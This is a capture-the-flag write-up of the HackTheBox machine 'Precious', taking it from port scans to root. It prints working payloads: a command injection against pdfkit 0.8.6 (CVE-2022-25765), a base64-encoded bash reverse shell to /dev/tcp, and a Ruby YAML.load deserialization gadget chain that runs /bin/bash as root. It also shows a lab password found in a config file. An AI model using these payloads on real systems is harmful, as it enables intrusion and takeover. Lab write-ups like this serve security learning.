---
layout: post
title: Precious - HackTheBox
date: 23/12/2022
author: Nehal Zaman
tags: ["os command injection", "insecure deserialization", "yaml", "ruby"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/precious/banner.png)

# INTRODUCTION

**Precious** is an easy linux based box on **HackTheBox**, created by [Nauten](https://www.hackthebox.com/home/users/profile/27582).

Foothold on the box is obtained through a CVE that leads to **Remote Code Execution (RCE)**.

Then a hardcoded secret gets us a low privileged **user**.

Finally the **root** on the box is obtained by a **insecure deserialization** vulnerability in a ruby library.

# SCANNING

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ rustscan -a 10.10.11.189 -r 1-65535 --ulimit 5000                           
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/n3hal/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.189:22
Open 10.10.11.189:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 03:15 EST
Initiating Ping Scan at 03:15
Scanning 10.10.11.189 [2 ports]
Completed Ping Scan at 03:15, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:15
Completed Parallel DNS resolution of 1 host. at 03:15, 5.56s elapsed
DNS resolution of 1 IPs took 5.56s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 03:15
Scanning 10.10.11.189 [2 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed Connect Scan at 03:15, 0.24s elapsed (2 total ports)
Nmap scan report for 10.10.11.189
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-12-23 03:15:35 EST for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.14 seconds

```

There are 2 ports open: **22** and **80**.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ nmap -sC -sV -p 22,80 -n 10.10.11.189
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 03:17 EST
Nmap scan report for 10.10.11.189
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds

```

Obviously, **SSH** is running on port 22 and **HTTP** web service on port 80.

Also, we get to know about a domain name `precious.htb`. We need to add this in our `/etc/hosts` file.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ nmap -sC -sV -p 80 -n precious.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-23 03:20 EST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds

```

The web server is running on `nginx/1.18.0`. 

Looking at the `http-title` (`Convert Web Page to PDF`), one can assume that the website is about a service that converts a web page to a pdf.

# ENUMERATING WEB

![](/assets/images/writeups/precious/1.png)

We can provide a URL, and this service probably snaps it into pdf.

![](/assets/images/writeups/precious/2.png)

When `https://google.com` is given as input, we can see the error message `Cannot load remote URL!`.

This is probably due to the fact that the box is not connected to the internet, and hence can not make request to the given URL.

This can be vulnerable to SSRF. Let us first see how should a correct output look like.

I am creating python `http.server` for this.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ echo '<h1>Testing by Cur1osity</h1>' > index.html        
                                                                                                                                                                                                       
┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ python -m http.server 80                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

![](/assets/images/writeups/precious/3.png)

When we give `http://<attacker ip>/index.html`, a pdf is sent back with our html page converted to pdf as contents.

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ exiftool ix1e6gpx3zrpxc7ra10ohxc1jlhsc91b.pdf 
ExifTool Version Number         : 12.44
File Name                       : ix1e6gpx3zrpxc7ra10ohxc1jlhsc91b.pdf
Directory                       : .
File Size                       : 11 kB
File Modification Date/Time     : 2022:12:23 03:39:46-05:00
File Access Date/Time           : 2022:12:23 03:39:46-05:00
File Inode Change Date/Time     : 2022:12:23 03:39:46-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
                                                            
```

The metadata of the PDF reveals the utility used to create it: `pdfkit v0.8.6`.

There is a RCE issue specific to that version of utility, having CVE id: `CVE-2022-25765`.

If `pdfkit` tries to render a URL that is controlled by user, it can potentially lead to RCE. 

If the provided parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF.

Learn more about it [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795).

**PAYLOAD**:

```

http://[attacker ip]/index.html?name=#{'%20`ping -c 4 [attacker ip]`'}

```

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:52:10.333065 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68
03:52:10.333086 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68
03:52:10.333095 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68
03:52:10.333100 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68
03:52:10.333107 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68
03:52:13.630245 IP 10.10.14.1 > 10.10.X.X: ICMP host precious.htb unreachable, length 68

```

We can see the pings on our box. The blind RCE is hence confirmed.

# SHELL AS RUBY

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ echo 'bash -i >& /dev/tcp/10.10.X.X/443 0>&1' | base64 
YmFzaCAtaSA+JiAv..........SNIP...........y80NDMgMD4mMQo=

```

The reverse shell payload is base64 encoded so the dangerous characters does not cause a problem.

**FINAL PAYLOAD**:

```

http://10.10.X.X/?name=#{'%20`echo YmFzaCAtaSA+JiAv..........SNIP...........y80NDMgMD4mMQo= | base64 -d | bash`'}

```

```bash

┌──(n3hal㉿Universe7)-[~/Documents/hackthebox/precious]
└─$ nc -nlp 443
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$

```

We got shell as user `ruby`.

# SHELL AS HENRY

```bash

ruby@precious:~$ ls -la
total 24
drwxr-xr-x 3 ruby ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ 
ruby@precious:~$ ls -la .bundle/
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 3 ruby ruby 4096 Oct 26 08:28 ..
-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config
ruby@precious:~$ 
ruby@precious:~$ cat .bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

```

The `/home/ruby/.bundle/config` file reveals the credentials for another user `henry`.

```bash

ruby@precious:~$ su - henry
Password: 
henry@precious:~$ 
henry@precious:~$ id; whoami
uid=1000(henry) gid=1000(henry) groups=1000(henry)
henry

```

# PRIVILEGE ESCALATION

```bash

henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

```

User `henry` can run the ruby script `/opt/update_dependencies.rb` as `root` without any password.

```bash

henry@precious:/opt$ ls -al
total 16
drwxr-xr-x  3 root root 4096 Oct 26 08:28 .
drwxr-xr-x 18 root root 4096 Nov 21 15:11 ..
drwxr-xr-x  2 root root 4096 Oct 26 08:28 sample
-rwxr-xr-x  1 root root  848 Sep 25 11:02 update_dependencies.rb
henry@precious:/opt$ cat update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
henry@precious:/opt$ cat sample/dependencies.yml 
yaml: 0.1.1
pdfkit: 0.8.6

```

The script file is not writable.

The script is reading names of gems and the versions from a YAML file. Then it compares the versions with the installed gem version, and prints something to the screen based on that. It is not even installing the dependency.

One thing worth noting here is that the file `dependencies.yml` does not have absolute path, meaning that we can control this `yml` file from any arbitrary directory we have access to.

The `yml` file is called on the `YAML.load()`. 

The `YAML.load()` function is vulnerable to insecure deserialization vulnerability which leads to RCE.

Read more about it [here](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/).

```bash

henry@precious:/dev/shm/cur1osity$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: /bin/bash
         method_id: :resolve
henry@precious:/dev/shm/cur1osity$ 
henry@precious:/dev/shm/cur1osity$ sudo ruby /opt/update_dependencies.rb 
sh: 1: reading: not found
root@precious:/dev/shm/cur1osity# 
root@precious:/dev/shm/cur1osity# id; whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@precious:/dev/shm/cur1osity# hostname
precious
root@precious:/dev/shm/cur1osity# date
Fri 23 Dec 2022 04:30:42 AM EST
root@precious:/dev/shm/cur1osity# 

```

When we ran the script as root, the value of `git_set` is called as bash command and we got root.

This is all in this box.

Thanks for reading this far.

Hope you liked it.




